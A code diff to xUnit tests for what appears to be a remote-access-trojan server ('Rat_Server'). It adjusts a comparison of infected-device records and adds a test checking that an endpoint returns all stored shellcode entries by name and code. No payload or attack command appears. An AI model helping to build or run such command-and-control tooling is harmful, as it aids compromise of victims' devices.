@@ -11,6 +11,7 @@ using Xunit.Abstractions;
 using Microsoft.Extensions.Configuration;
 using Microsoft.VisualStudio.TestPlatform.TestHost;
 using MySqlX.XDevAPI.Common;
+using Rat_Server.Model.DTOs;
 
 namespace Controller_Tests
 {
@@ -36,7 +37,7 @@ namespace Controller_Tests
             
             for(int i = 0; i < infectedDevices.Count; i++)
             {
-                Assert.Equal(resultContent[i], infectedDevices[i]);
+                Assert.Equal(resultContent[i].Hwid, infectedDevices[i].Hwid);
             }
         }
 
@@ -75,6 +76,24 @@ namespace Controller_Tests
 
             _context.Devices.Remove(devicePlaceholder);
             await _context.SaveChangesAsync();
+        }
+
+        [Fact]
+        private async void TestGetAllShellCode()
+        {
+            List<ShellCode> shellCodeEntities = await _context.ShellCodes.ToListAsync();
+            var result = await _controller.GetAllShellCode();
+            var resultContent = GetObjectResultValue<List<ShellCodeDto>>(result);
+
+            Assert.IsType<OkObjectResult>(result.Result);
+            Assert.NotNull(resultContent);
+            Assert.True(resultContent.Count == shellCodeEntities.Count);
+
+            for (int i = 0; i < shellCodeEntities.Count; i++)
+            {
+                Assert.Equal(resultContent[i].Name, shellCodeEntities[i].Name);
+                Assert.Equal(resultContent[i].Code, shellCodeEntities[i].Code);
+            }
         }
     }
 }
